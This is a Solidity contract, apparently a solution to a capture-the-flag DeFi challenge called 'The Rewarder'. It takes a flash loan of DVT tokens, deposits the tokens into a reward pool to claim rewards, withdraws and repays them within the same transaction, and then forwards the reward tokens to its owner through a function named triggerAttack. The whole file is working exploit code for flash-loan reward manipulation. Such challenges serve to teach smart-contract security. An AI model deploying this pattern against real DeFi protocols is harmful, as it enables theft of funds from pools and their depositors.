// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface IFlashLoanerPool{
    function flashLoan(uint256 amount) external;
}

interface ITheRewarderPool{
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external returns (uint256);
}

contract RewarderProxy{
    IFlashLoanerPool fp;
    ITheRewarderPool trp;
    IERC20 dvt;
    IERC20 rewardToken;
    address owner;

    constructor(address _fp, address _trp, address _dvt, address rewardAddr){
        fp = IFlashLoanerPool(_fp);
        trp = ITheRewarderPool(_trp);
        dvt = IERC20(_dvt);
        owner = msg.sender;
        rewardToken = IERC20(rewardAddr);
    }

    function receiveFlashLoan(uint256 amount) public{
        dvt.approve(address(trp), amount);
        trp.deposit(amount); 
        trp.withdraw(amount);
        dvt.transfer(address(fp), amount);       
    }

    function triggerAttack(uint256 _amount) external{
        fp.flashLoan(_amount);
    }

    function transferToOwner(uint256 amount) public{
        uint balance = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner, balance);
    }
}
